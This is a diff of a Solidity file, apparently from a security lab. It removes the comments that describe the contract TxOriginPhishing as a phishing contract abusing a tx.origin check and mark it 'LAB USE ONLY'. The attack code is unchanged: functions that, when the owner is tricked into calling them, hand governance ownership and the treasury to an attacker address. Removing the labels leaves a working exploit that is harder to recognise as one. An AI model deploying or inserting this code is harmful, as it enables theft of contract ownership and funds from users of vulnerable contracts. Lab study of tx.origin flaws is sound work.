@@ -6,10 +6,6 @@ interface ILabGovernance {
     function setTreasury(address newTreasury) external;
 }
 
-/// @title TxOriginPhishing
-/// @notice Phishing contract that abuses a `tx.origin` authentication check.
-/// @dev LAB USE ONLY. The owner calls `lure`; because `tx.origin` is still the
-///      owner, the vulnerable governance accepts the nested ownership transfer.
 contract TxOriginPhishing {
     ILabGovernance public immutable governance;
     address public immutable attacker;
@@ -21,12 +17,10 @@ contract TxOriginPhishing {
         attacker = attackerAddress;
     }
 
-    /// @notice Trick the owner into transferring governance ownership.
     function lure() external {
         governance.transferOwnership(attacker);
     }
 
-    /// @notice Trick the owner into changing the treasury.
     function lureTreasury() external {
         governance.setTreasury(attacker);
     }
